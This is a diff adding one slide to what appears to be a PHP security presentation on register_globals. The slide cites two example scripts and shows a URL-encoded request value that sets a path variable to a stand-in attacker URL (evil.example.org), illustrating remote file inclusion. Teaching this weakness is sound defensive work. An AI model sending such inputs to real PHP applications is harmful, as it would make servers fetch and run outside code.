@@ -1,0 +1,7 @@
+<slide>
+<title>Register Globals</title>
+<blurb fontsize="4em">Another example.</blurb>
+<example filename="code/register-globals-2.php" result="0" />
+<blurb fontsize="3.5em">%path=http\%3A\%2F\%2Fevil.example.org\%2F\%3F%</blurb>
+<example filename="code/register-globals-3.php" result="0" />
+</slide>
